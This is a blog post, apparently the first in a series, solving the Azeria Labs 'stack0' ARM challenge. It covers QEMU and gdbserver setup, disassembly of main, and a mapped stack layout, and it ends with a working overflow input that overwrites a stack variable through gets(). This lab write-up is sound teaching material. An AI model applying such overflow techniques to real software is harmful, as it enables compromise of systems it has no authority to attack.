---
layout: post
title: "Smashing ARM Stack for Fun - Part I"
---

This is the first of a serie of posts about exploiting 32 bits Arm
binaries.

These [challenges](https://github.com/azeria-labs/ARM-challenges) were
[taken](https://azeria-labs.com/part-3-stack-overflow-challenges/)
from [Azeria Labs](https://azeria-labs.com).<!--more-->

## Setup

{% marginmarkdowncode
'
For the records:
```cpp
qemu-system-arm
  -M versatilepb
  -cpu arm1176
  -m 256
  -drive "file=2020-12-02-raspios-buster-armhf-lite.img,if=none,index=0,media=disk,format=raw,id=disk0"
  -device "virtio-blk-pci,drive=disk0,disable-modern=on,disable-legacy=off"
  -net "user,hostfwd=tcp::3022-:22,hostfwd=tcp::9999-:9999"
  -dtb versatile-pb-buster-5.4.51.dtb
  -kernel kernel-qemu-5.4.51-buster
  -append "root=/dev/vda2 panic=1"
  -no-reboot
  -net nic
  -nographic
```
'
'' %}

Let's [spin a Rasbian](/articles/2020/12/15/Qemulating-Rasbian-ARM.html)
first. Make your to forward a port for the `ssh` and another for the
`gdbserver` so we can connect to them from the host machine.

There are [7 binaries](https://github.com/azeria-labs/ARM-challenges)
compiled for ARM for 32 bits, not stripped and dynamically linked.

We will focus on `stack0` for now.

```shell
$ file stack0
stack0: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux-armhf.so.3,
for GNU/Linux 2.6.32,
BuildID[sha1]=1171fa6db1d5176af44d6d462427f8d244bd82c8,
not stripped
```

Spin the `gdbserver`:

```shell
pi@raspberrypi:~$ gdbserver :9999 stack0
Process /home/pi/stack0 created; pid = 410
Listening on port 9999
```

And now, from the host, connect your `gdb` to the server. In my case I
will use [pwndbg](https://github.com/pwndbg/pwndbg), an enhanced version
of `gdb`.

```shell
$ gdb-multiarch -q -x ~/scripts/pwndbg.gdbinit
pwndbg> target extended-remote :9999
Remote debugging using <...>
Reading /home/pi/stack0 from remote target...
```

In addition to the debugger, I will use an
[interactive assembler](https://github.com/bad-address/iasm) to play
with some Arm code that I may not understand but which I don't want to
run in the debugger
(see [my post about `iasm`](/articles/2021/01/09/Interactive-Assembler.html)).

## Stack initialization

The stack initialization of `main` is as follows:

```nasm
pwndbg> pdisass &main
 ► 0x1044c <main>       push   {fp, lr}
   0x10450 <main+4>     add    fp, sp, #4
   0x10454 <main+8>     sub    sp, sp, #0x50
   0x10458 <main+12>    str    r0, [fp, #-0x50]
   0x1045c <main+16>    str    r1, [fp, #-0x54]
   0x10460 <main+20>    mov    r3, #0
   0x10464 <main+24>    str    r3, [fp, #-8]
   0x10468 <main+28>    sub    r3, fp, #0x48
   0x1046c <main+32>    mov    r0, r3
   0x10470 <main+36>    bl     #gets@plt <gets@plt>
```

The `lr` and the `fp` are pushed in that order (0x8 bytes),
the `fp` is updated and points to the pushed `lr` (`add fp, sp, #4`)
and then 0x50 bytes are allocated (`sub sp, sp, #0x50`).

The arguments of `main`, registers `r0` and `r1`, are saved on *top* of
the stack (`str r0, [fp, #-0x50]`, `str r1, [fp, #-0x54]`).

And then the cookie is stored:

```nasm
   0x10460 <main+20>    mov    r3, #0
   0x10464 <main+24>    str    r3, [fp, #-8]
```

This is our target.

## Call to `gets`

In the `main` function a call to `gets` is done with a buffer
allocated in the stack:

```nasm
pwndbg> pdisass
   0x10460 <main+20>    mov    r3, #0
   0x10464 <main+24>    str    r3, [fp, #-8]
   0x10468 <main+28>    sub    r3, fp, #0x48
   0x1046c <main+32>    mov    r0, r3
 ► 0x10470 <main+36>    bl     #gets@plt <gets@plt>
        r0: 0xbefffb6c ◂— 0x0
        r1: 0xbefffd04 —▸ 0xbefffe14 ◂— '/home/pi/stack0'
        r2: 0xbefffd0c —▸ 0xbefffe24 ◂— 'SHELL=/bin/bash'
        r3: 0xbefffb6c ◂— 0x0
```

The registers before the call to `gets` were:

```
------  ----  ------  ---------  ------  ---------  ------  ------
    r0  1fb4  r1      eeee:eeee  r2      0          r3      1fb4
    r4  0     r5      0          r6      0          r7      0
    r8  0     r9/sb   0          r10     0          r11/fp  1ffc
r12/ip  0     r13/sp  1fa8       r14/lr  aaaa:aaaa  r15/pc  100:20
------  ----  ------  ---------  ------  ---------  ------  ------
```

And the manually-annotated stack was:

```python
100:20> ;! M[sp:]   # <-- from sp to the end of the mapped page
[
        --
        |   \xee\xee\xee\xee   == r1
        |   \xdd\xdd\xdd\xdd   == r0
  0x50  |   \x00\x00\x00\x00
        |   ... 16 more rows full of zeros ...
cookie -|-->\x00\x00\x00\x00
        --
   0x8  |   \xbb\xbb\xbb\xbb   == fp
 fp ----|-->\xaa\xaa\xaa\xaa   == lr
        --
] <-- base of stack
```

`r3` points *almost* to the begin of the bunch of zeros, just 4
bytes below.

We can verify this writing and inspecting the memory:

```python
100:20> ;! M[r3:] = b"AAAABBBBCCCC"
100:20> ;! M[sp:]
[
        \xee\xee\xee\xee
        \xdd\xdd\xdd\xdd
        \x00\x00\x00\x00    == these are still zeros
buf --> AAAA
        BBBB
        CCCC
        \x00\x00\x00\x00
        ...
]
```

Indeed, the destination buffer of `gets` has 0x48 - 0x8 bytes
(we subtract 4 bytes for the cookie and 4 bytes for the stored `fp`)

```python
100:20> ;! M[sp:]
[
        --
        |   \xee\xee\xee\xee   == r1
        |   \xdd\xdd\xdd\xdd   == r0
  0x50  |   \x00\x00\x00\x00
buf ----|-->AAAA
        |   BBBB
        |   CCCC
        |   ... 13 more rows full of zeros ...
cookie -|-->\x00\x00\x00\x00
        --
   0x8  |   \xbb\xbb\xbb\xbb   == fp
 fp ----|-->\xaa\xaa\xaa\xaa   == lr
        --
]
```

## The target

The program stores a cookie initialized to zero in the stack *before*
the call to `gets` and then it checks its value.

```nasm
   0x10460 <main+20>    mov    r3, #0
   0x10464 <main+24>    str    r3, [fp, #-8]
    ...
   0x10470 <main+36>    bl     #gets@plt <gets@plt>
   0x10474 <main+40>    ldr    r3, [fp, #-8]
   0x10478 <main+44>    cmp    r3, #0
```

If it is still zero jumps to a `puts` that prints `"Try again?"`.

But if an overflow occurs, the cookies will be non-zero and another
`puts` will executed.

This is the print that we are looking for:

```nasm
   0x10480 <main+52>    ldr    r0, [pc, #0x18]
 ► 0x10484 <main+56>    bl     #puts@plt <puts@plt>
```

The address of the string to print is stored in the code segment, 0x18
bytes below the program counter at 0x10480.

However 0x10480 + 0x18 == 0x10498 is not correct:

```nasm
pwndbg> x/4 0x10498
0x10498 <main+76>:  0xe24bd004  0xe8bd8800  0x0001051c  0x00010548
```

почему?

> "When using R15 as the base register you must remember it contains an
> address 8 bytes on from the address of the current instruction."
> <cite class="epigraph">Arm documentation</cite>

So it is 0x10498 + 0x8:

```nasm
pwndbg> x/4 0x104a0
0x104a0 <main+84>:  0x0001051c  0x00010548  0xe92d43f8  0xe1a07000

pwndbg> p (char*)0x0001051c
$21 = 0x1051c "you have changed the 'modified' variable"
```

## The exploit

Writing 0x40+1 bytes we will overflow the buffer overwriting the cookie
in the stack but without corrupting the stack further.

```shell
pi@raspberrypi:~$ echo -n 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | ./stack0
you have changed the 'modified' variable
```
